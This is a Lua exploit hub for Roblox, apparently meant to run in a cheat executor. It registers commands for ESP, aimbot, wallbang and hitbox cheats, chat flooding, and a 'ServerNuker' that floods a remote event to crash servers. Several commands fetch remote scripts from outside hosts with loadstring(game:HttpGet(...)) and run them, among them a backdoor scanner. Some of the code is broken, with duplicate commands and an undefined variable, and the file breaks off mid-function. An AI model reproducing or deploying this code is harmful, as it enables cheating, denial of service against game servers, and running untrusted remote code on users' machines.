-- Blockhead.EXE Hub v1.0 – Mythic Legacy Edition
-- Created by Harry
-- Features: CoolKid-style terminal, glitch popups, smart command parser, modular execution
--]]
--key >> SYSTEM ONLINE...
--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Debris = game:GetService("Debris")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "BlockheadEXE"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999
gui.Parent = player:WaitForChild("PlayerGui")

--// Terminal Frame
local terminal = Instance.new("Frame")
terminal.Name = "Terminal"
terminal.Size = UDim2.new(0, 400, 0, 250)
terminal.Position = UDim2.new(1, -410, 1, -260)
terminal.AnchorPoint = Vector2.new(1, 1)
terminal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
terminal.BorderSizePixel = 0
terminal.Parent = gui

local border = Instance.new("UIStroke")
border.Color = Color3.fromRGB(255, 0, 0)
border.Thickness = 2
border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
border.Parent = terminal

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "BLOCKHEAD.EXE // LEGACY MODE"
title.Font = Enum.Font.Code
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = terminal

--// Log Output
local log = Instance.new("TextLabel")
log.Name = "Log"
log.Size = UDim2.new(1, -10, 1, -70)
log.Position = UDim2.new(0, 5, 0, 35)
log.BackgroundTransparency = 1
log.Text = ">> SYSTEM ONLINE...\n"
log.Font = Enum.Font.Code
log.TextSize = 14
log.TextColor3 = Color3.fromRGB(255, 0, 0)
log.TextXAlignment = Enum.TextXAlignment.Left
log.TextYAlignment = Enum.TextYAlignment.Top
log.TextWrapped = true
log.TextScaled = false
log.TextStrokeTransparency = 0.8
log.TextTruncate = Enum.TextTruncate.AtEnd
log.ClipsDescendants = true
log.Parent = terminal

--// Command Input
local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(1, -10, 0, 30)
inputBox.Position = UDim2.new(0, 5, 1, -35)
inputBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
inputBox.TextColor3 = Color3.fromRGB(255, 0, 0)
inputBox.Font = Enum.Font.Code
inputBox.TextSize = 14
inputBox.PlaceholderText = ".command args"
inputBox.ClearTextOnFocus = false
inputBox.Text = ""
inputBox.Parent = terminal

--// Glitch Pulse
local function glitchPulse()
    local clone = terminal:Clone()
    clone.Name = "GlitchOverlay"
    clone.BackgroundTransparency = 0.7
    clone.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    clone.ZIndex = 10
    clone.Parent = gui
    Debris:AddItem(clone, 0.1)
end

--// Mythic Popup
local function mythicPopup(text)
    log.Text = log.Text .. ">> " .. text .. "\n"
    glitchPulse()
end

--// ESP Logic
local ESP_COLOR = Color3.fromRGB(255, 0, 0)
local ESP_TRANSPARENCY = 0.5

local function createESP(player)
    local torso = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if torso then
        local esp = Instance.new("BoxHandleAdornment")
        esp.Adornee = torso
        esp.Size = torso.Size + Vector3.new(0.1, 0.1, 0.1)
        esp.Color3 = ESP_COLOR
        esp.Transparency = ESP_TRANSPARENCY
        esp.AlwaysOnTop = true
        esp.ZIndex = 5
        esp.Parent = torso
    end
end

local function updateESP()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            createESP(p)
        end
    end
end

--// Command Registry
local commands = {}

commands["popup"] = function(args)
    mythicPopup(table.concat(args, " "))
end



commands["esp"] = function()
    pcall(function()
        updateESP()
        RunService.RenderStepped:Connect(updateESP)
        mythicPopup("ESP activated.")
    end)
end

commands["silentaim"] = function()
    pcall(function()
       
        mythicPopup("Silent Aim TSB executed.")
    end)
end

commands["admin"] = function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        mythicPopup("Infinite Yield executed.")
    end)
end

commands["Clickforme"] = function()
    pcall(function()
        --// Mythic AutoClick GUI
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local player = Players.LocalPlayer
        local mouse = player:GetMouse()

        -- Prevent duplicate GUI
        if game.CoreGui:FindFirstChild("MythicClickGUI") then
            game.CoreGui.MythicClickGUI:Destroy()
        end

        local gui = Instance.new("ScreenGui")
        gui.Name = "MythicClickGUI"
        gui.ResetOnSpawn = false
        gui.Parent = game:GetService("CoreGui")

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 200, 0, 80)
        frame.Position = UDim2.new(1, -220, 1, -120)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        frame.BorderSizePixel = 0
        frame.Parent = gui

        Instance.new("UICorner", frame)

        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -20, 0, 40)
        button.Position = UDim2.new(0, 10, 0, 20)
        button.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
        button.Text = "⚡ AutoClick: OFF"
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.Code
        button.TextScaled = true
        button.Parent = frame

        local glitch = Instance.new("UIStroke", button)
        glitch.Thickness = 1
        glitch.Color = Color3.fromRGB(255, 0, 255)

        -- Click Logic
        local clicking = false

        button.MouseButton1Click:Connect(function()
            clicking = not clicking
            button.Text = clicking and "⚡ AutoClick: ON" or "⚡ AutoClick: OFF"
            button.BackgroundColor3 = clicking and Color3.fromRGB(80, 0, 120) or Color3.fromRGB(40, 0, 60)
        end)

        -- Frame-Perfect Click Loop
        RunService.RenderStepped:Connect(function()
            if clicking then
                pcall(function()
                    mouse1click() -- Requires exploit environment
                end)
            end
        end)

        -- Mythic feedback
        if typeof(mythicPopup) == "function" then
            mythicPopup("autoclicker executed.")
        else
            warn("mythicPopup not defined")
        end
    end)
end

commands["wallbang"] = function(targetName)
    pcall(function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        -- Find target player by name
        local targetPlayer = nil
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name:lower():sub(1, #targetName) == targetName:lower() then
                targetPlayer = plr
                break
            end
        end

        if not (targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")) then
            warn("Wallbang failed: Target not found or invalid.")
            return
        end

        local origin = hrp.Position
        local targetPos = targetPlayer.Character.HumanoidRootPart.Position
        local direction = (targetPos - origin).Unit * 999

        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Blacklist
        rayParams.FilterDescendantsInstances = {char}

        local result = Workspace:Raycast(origin, direction, rayParams)

        if result then
            local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:TakeDamage(100) -- or humanoid.Health = 0
            end

            if typeof(mythicPopup) == "function" then
                mythicPopup("☠️ Wallbanged " .. targetPlayer.Name .. " through " .. result.Instance.Name)
            end
        else
            warn("Wallbang missed.")
        end
    end)
end

commands["aimbot"] = function(targetName)
    pcall(function()
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local Camera = Workspace.CurrentCamera

        local function getTarget(name)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Name:lower():sub(1, #name) == name:lower() then
                    return plr
                end
            end
            return nil
        end

        local target = getTarget(targetName)
        if not (target and target.Character and target.Character:FindFirstChild("Head")) then
            warn("Aimbot failed: Target not found or missing head.")
            return
        end

        -- Mythic lock-on loop
        local conn
        conn = RunService.RenderStepped:Connect(function()
            if not target.Character or not target.Character:FindFirstChild("Head") then
                conn:Disconnect()
                return
            end

            local headPos = target.Character.Head.Position
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, headPos)
        end)

        if typeof(mythicPopup) == "function" then
            mythicPopup("🎯 Aimbot locked on " .. target.Name)
        end
    end)
end

commands["aimlock"] = function(targetName)
    pcall(function()
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local Camera = Workspace.CurrentCamera

        -- Find target by partial name
        local function getTarget(name)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Name:lower():sub(1, #name) == name:lower() then
                    return plr
                end
            end
            return nil
        end

        local target = getTarget(targetName)
        if not (target and target.Character and target.Character:FindFirstChild("Head")) then
            warn("Aimlock failed: Target not found or missing head.")
            return
        end

        -- Lock-on loop
        local conn
        conn = RunService.RenderStepped:Connect(function()
            if not target.Character or not target.Character:FindFirstChild("Head") then
                conn:Disconnect()
                return
            end

            local headPos = target.Character.Head.Position
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, headPos)
        end)

        if typeof(mythicPopup) == "function" then
            mythicPopup("🎯 Aimlocked onto " .. target.Name)
        end
    end)
end

commands["GAG"] = function(targetName)
    pcall(function()
        loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
        mythicPopup("🪐 Orbiting " .. target.Name)
    end)
end


commands["orbit"] = function(targetName)
    pcall(function()
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local LocalPlayer = Players.LocalPlayer
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        local target = Players:FindFirstChild(targetName)
        if not (target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) then return end

        local angle = 0
        local radius = 10

       local angle = 0
local radius = 10

RunService.RenderStepped:Connect(function()
    angle = angle + 0.05
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and hrp then
        local targetPos = target.Character.HumanoidRootPart.Position
        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
        hrp.CFrame = CFrame.new(targetPos + offset, targetPos)
    end
end)


        mythicPopup("🪐 Orbiting " .. target.Name)
    end)
end

commands["tracers"] = function()
    pcall(function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local cam = Workspace.CurrentCamera

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local beam = Instance.new("Beam")
                local a = Instance.new("Attachment", cam)
                local b = Instance.new("Attachment", plr.Character.HumanoidRootPart)
                beam.Attachment0 = a
                beam.Attachment1 = b
                beam.Color = ColorSequence.new(Color3.fromRGB(255, 0, 255))
                beam.Width0 = 0.1
                beam.Width1 = 0.1
                beam.Parent = cam
            end
        end

        mythicPopup("🎯 Tracers deployed.")
    end)
end

commands["serverhop"] = function()
    pcall(function()
        local tp = game:GetService("TeleportService")
        local placeId = game.PlaceId

        -- Optional: fetch public servers via HttpService (requires exploit)
        tp:Teleport(placeId)

        mythicPopup("🌐 Serverhop initiated.")
    end)
end

commands["rejoin"] = function()
    pcall(function()
        local tp = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)

        mythicPopup("🔁 Rejoining server...")
    end)
end

commands["hallucinate"] = function(targetName)
    pcall(function()
        local Players = game:GetService("Players")
        local target = Players:FindFirstChild(targetName)
        if not (target and target.Character) then return end

        for i = 1, 3 do
            local clone = target.Character:Clone()
            clone.Name = "Hallucination_" .. i
            for _, desc in pairs(clone:GetDescendants()) do
                if desc:IsA("BasePart") then
                    desc.Anchored = true
                    desc.CanCollide = false
                    desc.Material = Enum.Material.ForceField
                    desc.Color = Color3.fromRGB(255, 0, 255)
                elseif desc:IsA("Script") or desc:IsA("LocalScript") then
                    desc:Destroy()
                end
            end
            clone.Parent = workspace
            clone:SetPrimaryPartCFrame(target.Character:GetPrimaryPartCFrame() * CFrame.new(math.random(-5,5), 0, math.random(-5,5)))
            game.Debris:AddItem(clone, 10)
        end

        mythicPopup("👁️ Hallucinations spawned around " .. target.Name)
    end)
end

commands["mirrorworld"] = function()
    pcall(function()
        local Lighting = game:GetService("Lighting")

        Lighting.Ambient = Color3.fromRGB(0, 0, 0)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 255)
        Lighting.FogColor = Color3.fromRGB(20, 0, 40)
        Lighting.FogEnd = 100
        Lighting.Brightness = 0.5
        Lighting.ClockTime = 0

        local blur = Instance.new("BlurEffect", Lighting)
        blur.Size = 12

        local colorShift = Instance.new("ColorCorrectionEffect", Lighting)
        colorShift.TintColor = Color3.fromRGB(255, 0, 255)
        colorShift.Saturation = -0.5
        colorShift.Contrast = 0.3

        mythicPopup("🪞 Mirror World Activated")
    end)
end

commands["chatflood"] = function(text)
    pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if not SayMessageRequest then return end

        for i = 1, 10 do
            local glitchText = text .. string.rep(string.char(math.random(33,126)), math.random(1,3))
            SayMessageRequest:FireServer(glitchText, "All")
            wait(0.1)
        end

        mythicPopup("📣 Chat flooded with \"" .. text .. "\"")
    end)
end

commands["scramblegui"] = function()
    pcall(function()
        local CoreGui = game:GetService("CoreGui")
        local function scramble(obj)
            if obj:IsA("GuiObject") then
                obj.Position = UDim2.new(0, math.random(0, 800), 0, math.random(0, 500))
                obj.Size = UDim2.new(0, math.random(50, 300), 0, math.random(20, 100))
                obj.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
                obj.Rotation = math.random(-15, 15)
            end
            for _, child in pairs(obj:GetChildren()) do
                scramble(child)
            end
        end

        for _, gui in pairs(CoreGui:GetChildren()) do
            scramble(gui)
        end

        mythicPopup("🌀 GUI scrambled.")
    end)
end

commands["noclip"] = function()
    pcall(function()
        local RunService = game:GetService("RunService")
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

        RunService.Stepped:Connect(function()
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)

        mythicPopup("🧱 Noclip enabled.")
    end)
end


commands["flightgui"] = function()
    pcall(function()
        --// Mythic Flight Module
        local UIS = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")

        local player = Players.LocalPlayer
        local char = player.Character or player.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")

        --// Flight Core
        local flying = false
        local speed = 20
        local boostMultiplier = 5.5 -- Speed boost multiplier
        local isBoosting = false

        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bv.P = 1e4
        bv.Name = "MythicFlightVelocity"

        --// Toggle Flight
        UIS.InputBegan:Connect(function(input, gpe)
            if gpe then return end
            if input.KeyCode == Enum.KeyCode.E then
                flying = not flying
                bv.Parent = flying and hrp or nil

                if flying then
                    mythicPopup("Flight mode: ENGAGED ⚡")
                else
                    mythicPopup("Flight mode: DISENGAGED ⛔")
                end
            elseif input.KeyCode == Enum.KeyCode.LeftShift then -- Boost Key
                isBoosting = true
            end
        end)

        UIS.InputEnded:Connect(function(input, gpe)
            if gpe then return end
            if input.KeyCode == Enum.KeyCode.LeftShift then
                isBoosting = false
            end
        end)

        --// Movement Loop
        RunService.RenderStepped:Connect(function()
            if flying and hrp then
                local cam = workspace.CurrentCamera
                local moveVec = Vector3.zero

                if UIS:IsKeyDown(Enum.KeyCode.W) then
    moveVec = moveVec + cam.CFrame.LookVector
end
if UIS:IsKeyDown(Enum.KeyCode.S) then
    moveVec = moveVec - cam.CFrame.LookVector
end
if UIS:IsKeyDown(Enum.KeyCode.A) then
    moveVec = moveVec - cam.CFrame.RightVector
end
if UIS:IsKeyDown(Enum.KeyCode.D) then
    moveVec = moveVec + cam.CFrame.RightVector
end
if UIS:IsKeyDown(Enum.KeyCode.Space) then
    moveVec = moveVec + Vector3.new(0, 1, 0)
end
if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
    moveVec = moveVec - Vector3.new(0, 1, 0)
end

                local currentSpeed = speed
                if isBoosting then
                    currentSpeed = speed * boostMultiplier
                end

                bv.Velocity = moveVec.Magnitude > 0 and moveVec.Unit * currentSpeed or Vector3.zero
            end
        end)
        mythicPopup("Flight executed.")
    end)
end

commands["hitboxmaker"] = function()
    pcall(function()
        _G.HeadSize = 20
        _G.Disabled = true
        RunService.RenderStepped:Connect(function()
            if _G.Disabled then
                for _, v in ipairs(Players:GetPlayers()) do
                    if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = v.Character.HumanoidRootPart
                        hrp.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                        hrp.Transparency = 0.8
                        hrp.BrickColor = BrickColor.new("Forest Green")
                        hrp.Material = Enum.Material.Neon
                        hrp.CanCollide = false
                    end
                end
            end
        end)
        mythicPopup("HitboxMaker activated.")
    end)
end

commands["coolkidgui"] = function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hyperionhax/c00lgui/refs/heads/main/CoolGui.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rtlsmonk/c00lgui-made-by-rtls_a1-on-discord/refs/heads/main/have-fun"))()
        mythicPopup("CoolKid GUI executed.")
    end)
end

commands["fisch"] = function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
        mythicPopup("Fisch GUI executed.")
    end)
end

commands["fehats"] = function(args)
    pcall(function()
        local plr = game.Players.LocalPlayer
        local chr = plr.Character
        local hum = chr:WaitForChild("Humanoid")
        local mov, mov2, par = {}, {}, {}

        -- Network override
        coroutine.wrap(function()
            settings().Physics.AllowSleep = false
            game:GetService("RunService").RenderStepped:Connect(function()
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= plr then
                        v.MaximumSimulationRadius = 0.1
                        v.SimulationRadius = 0
                    else
                        v.MaximumSimulationRadius = math.huge
                        v.SimulationRadius = math.huge
                    end
                end
            end)
        end)()

        -- Netless velocity
        local netlessvel = Vector3.new(0, 25.1, 0)
        local function MW_netless(part)
            local vel = part.Velocity
            local con0, con1
            part:GetPropertyChangedSignal("Parent"):Connect(function()
                if not part.Parent then
                    con0:Disconnect()
                    con1:Disconnect()
                end
            end)
            con0 = game:GetService("RunService").RenderStepped:Connect(function()
                part.Velocity = vel
            end)
            con1 = game:GetService("RunService").Heartbeat:Connect(function()
                vel = part.Velocity
                part.Velocity = netlessvel
            end)
        end

        -- Accessory prep
        for _, v in pairs(hum:GetAccessories()) do
            local b = v.Handle
            b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            b.CanCollide = false
            b:BreakJoints()
            for _, k in pairs(v:GetChildren()) do
                if not k:IsA("SpecialMesh") and not k:IsA("Part") then
                    k:Destroy()
                end
            end
            local still = Instance.new("BodyAngularVelocity", b)
            still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            still.AngularVelocity = Vector3.new(0, 0, 0)
            local align = Instance.new("AlignPosition", b)
            align.MaxForce = 1000000
            align.MaxVelocity = math.huge
            align.RigidityEnabled = false
            align.ApplyAtCenterOfMass = true
            align.Responsiveness = 200
            local a0 = Instance.new("Attachment", b)
            local a1 = Instance.new("Attachment", chr.Head)
            align.Attachment0 = a0
            align.Attachment1 = a1
            table.insert(mov, a1)
            table.insert(mov2, still)
            MW_netless(b)
        end

        for _, v in pairs(mov) do
            local p = Instance.new("Part", workspace)
            p.Anchored = true
            p.Size = Vector3.new(1, 1, 1)
            p.Transparency = 1
            p.CanCollide = false
            table.insert(par, p)
        end

        -- Motion variables
        local rotx, rotz, height, heighti = 0, math.pi / 2, 0, 1
        local offset, speed, mode = 10, 0.5, 4
        local angular = Vector3.new(0, 0, 0)
        local l = 1

        game:GetService("RunService").RenderStepped:Connect(function()
            rotx = rotx + speed / 100
            rotz = rotz + speed / 100
            l = (l >= 360 and 1 or l + speed)

            for i, v in pairs(par) do
                v.CFrame = CFrame.new(chr.HumanoidRootPart.Position)
                    * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0)
                    * CFrame.new(offset, 0, 0)
            end

            height = height + (heighti == 1 and speed or -speed) / 100
            if height > 2 then heighti = 2 end
            if height < -1 then heighti = 1 end

            -- Modes
            local function localize(pos)
                return chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(pos)).Position
            end

            for i, v in pairs(mov) do
                local pos = Vector3.new()
                if mode == 1 then
                    pos = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset)
                elseif mode == 2 then
                    pos = Vector3.new(offset, height, offset)
                elseif mode == 3 then
                    pos = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset)
                elseif mode == 4 then
                    pos = localize(par[i].Position)
                elseif mode == 5 then
                    pos = Vector3.new(math.sin(rotx) * offset, height, (math.cos(rotz) - i) * offset)
                elseif mode == 6 then
                    pos = Vector3.new(math.sin(rotx) * offset, height, (math.tan(rotz) - i) * offset)
                elseif mode == 7 then
                    pos = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset)
                elseif mode == 8 then
                    pos = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset)
                elseif mode == 9 then
                    local so
                    for _, tool in pairs(chr:GetChildren()) do
                        if tool:IsA("Tool") then
                            for _, j in pairs(tool:GetDescendants()) do
                                if j:IsA("Sound") then so = j end
                            end
                        end
                    end
                    if so then
                        offset = so.PlaybackLoudness / 35
                        speed = so.PlaybackLoudness / 500
                        angular = Vector3.new(0, so.PlaybackLoudness / 75, 0)
                    end
                    pos = localize(par[i].Position)
                elseif mode == 10 then
                    offset = height * 15
                    pos = localize(par[i].Position)
                elseif mode == 11 then
                    local mousePos = plr:GetMouse().Hit.p
                    pos = localize(mousePos) + localize(par[i].Position)
                end
                v.Position = pos
            end

            for _, v in pairs(mov2) do
                v.AngularVelocity = angular
            end
        end)

        -- Subcommand handler
        local function ftp(str)
            local pt = {}
            if str == "me" then
                table.insert(pt, plr)
            elseif str == "random" then
                table.insert(pt, game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())])
            else
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v.Name:lower():find(str:lower()) then
                        table.insert(pt, v)
                    end
                end
            end
            return pt
        end

        local function handleFehatsCommand(command, args)
            if command == "orbit" then
                local targetPlayer = ftp(args[1])[1]
                if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    chr = targetPlayer.Character
                    mythicPopup("Orbiting: " .. targetPlayer.Name)
                else
                    mythicPopup("Invalid player name for orbit.")
                end
            elseif command == "speed" then
                speed = tonumber(args[1]) or speed
                mythicPopup("Speed set to " .. tostring(speed))
            elseif command == "mode" then
                mode = tonumber(args[1]) or mode
                mythicPopup("Mode set to " .. tostring(mode))
            elseif command == "offset" then
                offset = tonumber(args[1]) or offset
                mythicPopup("Offset set to " .. tostring(offset))
            elseif command == "angular" then
                angular = Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0)
                mythicPopup("Angular velocity set.")
            elseif command == "stop" then
                _G.Disabled = true
                mythicPopup("Fehats stopped.")  
            end
        end
        -- Command listener
        inputBox.FocusLost:Connect(function(enter)
            if enter then
                local input = inputBox.Text
                if input:sub(1, 8):lower() == ".fehats " then
                    local args = input:sub(9):split(" ")
                    local cmd = args[1]:lower()
                    table.remove(args, 1)
                    handleFehatsCommand(cmd, args)
                    inputBox.Text = ""
                end
            end
        end)
    end)
end
commands["backdoor"] = function()
    pcall(function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"))()
    end)
end

commands["ServerNuker"] = function()
    pcall(function()
        while wait(0.6) do --// don't change it's the best
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function getmaxvalue(val)
                local mainvalueifonetable = 499999
                if type(val) ~= "number" then
                    return nil
                end
                local calculateperfectval = (mainvalueifonetable / (val + 2))
                return calculateperfectval
            end

            local function bomb(tableincrease, tries)
                local maintable = {}
                local spammedtable = {}

                table.insert(spammedtable, {})
                z = spammedtable[1]

                for i = 1, tableincrease do
                    local tableins = {}
                    table.insert(z, tableins)
                    z = tableins
                end

                local calculatemax = getmaxvalue(tableincrease)
                local maximum

                if calculatemax then
                    maximum = calculatemax
                else
                    maximum = 999999
                end

                for i = 1, maximum do
                    table.insert(maintable, spammedtable)
                end

                for i = 1, tries do
                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                end
            end

            bomb(250, 2) --// change values if client crashes.
        end
    end)
end

commands["serverannouncement"] = function(message)
    pcall(function()
        local CoreGui = game:GetService("CoreGui")

        -- Prevent stacking
        if CoreGui:FindFirstChild("MythicAnnouncement") then
            CoreGui.MythicAnnouncement:Destroy()
        end

        local gui = Instance.new("ScreenGui")
        gui.Name = "MythicAnnouncement"
        gui.ResetOnSpawn = false
        gui.Parent = CoreGui

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.BackgroundTransparency = 0.4
        frame.BorderSizePixel = 0
        frame.Parent = gui

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 0, 100)
        label.Position = UDim2.new(0, 0, 0.5, -50)
        label.BackgroundTransparency = 1
        label.Text = message
        label.TextColor3 = Color3.fromRGB(255, 0, 255)
        label.TextStrokeTransparency = 0.5
        label.Font = Enum.Font.Code
        label.TextScaled = true
        label.Parent = frame

        -- Glitch flicker
        coroutine.wrap(function()
            for i = 1, 30 do
                label.TextColor3 = Color3.fromRGB(math.random(200,255), 0, math.random(200,255))
                label.Position = UDim2.new(0, math.random(-5,5), 0.5, -50 + math.random(-3,3))
                wait(0.05)
            end
        end)()

        -- Auto-remove after 5 seconds
        game.Debris:AddItem(gui, 5)

        mythicPopup("📣 Server Announcement: " .. message)
    end)
end

commands["soundgui"] = function()
    pcall(function()
        local sound = Instance.new("Sound", game:GetService("CoreGui"))
        sound.SoundId = "rbxassetid://0" -- Mythic glitch burst
        sound.Volume = 1
        sound:Play()

        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "SoundPulseGUI"

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
        frame.BackgroundTransparency = 0.8

        game.Debris:AddItem(gui, 1)
        mythicPopup("🔊 Sound GUI executed.")
    end)
end

commands["theme"] = function(name)
    pcall(function()
        mythicPopup("🎨 Theme set to: " .. name)
        -- You can wire this to change colors/fonts across your GUI modules
    end)
end

commands["GAG"] = function(name)
    pcall(function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/depthso/Grow-a-Garden/refs/heads/main/autofarm.lua')))()
        mythicPopup("🎨 Theme set to: " .. name)
    end)
end

commands["soundgui"] = function()
    pcall(function()
        local sound = Instance.new("Sound", game:GetService("CoreGui"))
        sound.SoundId = "rbxassetid://9118823106" -- Mythic glitch burst
        sound.Volume = 1
        sound:Play()

        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "SoundPulseGUI"

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
        frame.BackgroundTransparency = 0.8

        game.Debris:AddItem(gui, 1)
        mythicPopup("🔊 Sound GUI executed.")
    end)
end

commands["version"] = function()
    pcall(function()
        mythicPopup("🧬 Blockhead.EXE v0.0.3 | Legacy Mode: ON")
    end)
end

commands["glitchfeed"] = function(text)
    pcall(function()
        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "GlitchFeed"

        local label = Instance.new("TextLabel", gui)
        label.Size = UDim2.new(1, 0, 0, 30)
        label.Position = UDim2.new(0, 0, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.Font = Enum.Font.Code
        label.TextColor3 = Color3.fromRGB(255, 0, 255)
        label.TextStrokeTransparency = 0.5
        label.TextScaled = true

        coroutine.wrap(function()
            for i = 1, 100 do
                label.Position = UDim2.new(0, -i * 10, 0, 0)
                wait(0.05)
            end
            gui:Destroy()
        end)()

        mythicPopup("📡 Glitchfeed broadcasted.")
    end)
end

commands["blackout"] = function()
    pcall(function()
        local Lighting = game:GetService("Lighting")
        Lighting.Brightness = 0
        Lighting.ClockTime = 0
        Lighting.FogEnd = 10
        Lighting.FogColor = Color3.fromRGB(0, 0, 0)

        local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
        gui.Name = "BlackoutGUI"

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        frame.BackgroundTransparency = 0.9

        game.Debris:AddItem(gui, 5)
        mythicPopup("🌑 Blackout triggered.")
    end)
end

commands["blind"] = function()
    pcall(function()
    --// CoolKid-style Blind Menu GUI
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
